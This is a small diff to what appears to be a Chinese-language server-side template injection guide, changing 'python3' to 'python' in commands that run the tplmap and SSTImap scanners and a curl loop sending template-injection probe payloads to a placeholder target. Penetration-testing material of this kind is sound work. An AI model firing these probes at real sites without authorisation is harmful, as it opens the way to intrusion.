@@ -372,11 +372,11 @@ Java 模板引擎可以通过实例化 Java Runtime 类直接执行命令：
 python2 tplmap.py -u "https://target.com/page?name=test"
 
 # SSTImap — Python3 版
-python3 sstimap.py -u "https://target.com/page?name=test"
+python sstimap.py -u "https://target.com/page?name=test"
 
 # 手动 fuzzing
 for payload in '{{7*7}}' '${7*7}' '{{7*7}}' '<%=7*7%>' '#{7*7}'; do
-  curl -s "https://target.com/?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
+  curl -s "https://target.com/?q=$(python -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
 done
 ```
 
